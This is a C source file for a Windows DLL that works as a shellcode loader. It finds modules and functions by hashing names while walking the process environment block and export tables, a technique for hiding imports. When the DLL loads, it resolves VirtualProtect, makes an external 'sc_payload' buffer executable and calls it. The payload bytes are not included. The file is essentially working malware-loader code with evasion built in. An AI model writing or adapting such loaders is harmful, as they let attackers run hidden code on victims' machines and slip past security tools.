#include <windows.h>

extern unsigned char sc_payload[];
extern unsigned char sc_payload_end[];

#define SC_PAYLOAD_SIZE ((size_t)(sc_payload_end - sc_payload))

static unsigned int _fnv1a_ci ( const WCHAR * s )
{
    unsigned int h = 0x811c9dc5u;
    while ( *s ) {
        unsigned char c = (unsigned char)*s;
        if ( c >= 'A' && c <= 'Z' ) c += 0x20;
        h ^= c; h *= 0x01000193u; s++;
    }
    return h;
}

static unsigned int _fnv1a ( const char * s )
{
    unsigned int h = 0x811c9dc5u;
    while ( *s ) { h ^= (unsigned char)*s++; h *= 0x01000193u; }
    return h;
}

static void * _find_mod ( unsigned int hash )
{
    char * peb;
#ifdef _WIN64
    peb = (char *) __readgsqword ( 0x60 );
#else
    peb = (char *) __readfsdword ( 0x30 );
#endif
    char * ldr  = *(char **)( peb + 0x18 );
    char * head = ldr + 0x20;
    char * curr = *(char **) head;
    while ( curr != head ) {
        WCHAR * n = *(WCHAR **)( curr + 0x40 );
        if ( n ) {
            WCHAR * bn = n; WCHAR * p = n;
            while ( *p ) { if ( *p == '\\' || *p == '/' ) bn = p + 1; p++; }
            if ( _fnv1a_ci ( bn ) == hash ) return *(void **)( curr + 0x20 );
        }
        curr = *(char **) curr;
    }
    return 0;
}

static FARPROC _find_exp ( void * base, unsigned int hash )
{
    if ( !base ) return 0;
    char * b = (char *) base;
    DWORD pe = *(DWORD *)( b + 0x3C );
    char * nt = b + pe;
#ifdef _WIN64
    DWORD erva = *(DWORD *)( nt + 0x18 + 0x70 );
    DWORD esz  = *(DWORD *)( nt + 0x18 + 0x70 + 4 );
#else
    DWORD erva = *(DWORD *)( nt + 0x18 + 0x60 );
    DWORD esz  = *(DWORD *)( nt + 0x18 + 0x60 + 4 );
#endif
    if ( !erva || !esz ) return 0;
    char  * e = b + erva;
    DWORD   n = *(DWORD *)( e + 0x18 );
    DWORD * nm = (DWORD *)( b + *(DWORD *)( e + 0x20 ) );
    WORD  * od = (WORD  *)( b + *(DWORD *)( e + 0x24 ) );
    DWORD * fn = (DWORD *)( b + *(DWORD *)( e + 0x1C ) );
    for ( DWORD i = 0; i < n; i++ )
        if ( _fnv1a ( b + nm[i] ) == hash )
            return (FARPROC)( b + fn[ od[i] ] );
    return 0;
}

BOOL WINAPI DllMain ( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved )
{
    if ( fdwReason == DLL_PROCESS_ATTACH )
    {
        /* 0xa3e6f6c3 = kernel32.dll, 0x820621f3 = VirtualProtect */
        typedef BOOL (WINAPI *tVP)(LPVOID, SIZE_T, DWORD, PDWORD);
        tVP pVP = (tVP) _find_exp ( _find_mod ( 0xa3e6f6c3u ), 0x820621f3u );

        DWORD old = 0;
        if ( pVP && pVP ( sc_payload, SC_PAYLOAD_SIZE, PAGE_EXECUTE_READ, &old ) )
        {
            ( (void (*)(void*)) sc_payload ) ( lpvReserved );
        }
    }

    return TRUE;
}
